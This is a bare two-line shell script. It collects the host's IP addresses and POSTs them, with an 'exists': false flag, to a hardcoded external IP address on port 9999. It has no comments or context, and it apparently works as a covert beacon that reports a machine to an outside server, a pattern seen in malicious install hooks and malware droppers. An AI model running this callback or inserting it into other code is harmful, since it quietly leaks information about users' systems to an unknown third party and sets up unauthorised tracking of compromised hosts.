IP=$(hostname -I)
curl -X POST -d "{\"ip\": \"$IP\", \"exists\": false}" http://5.180.183.19:9999
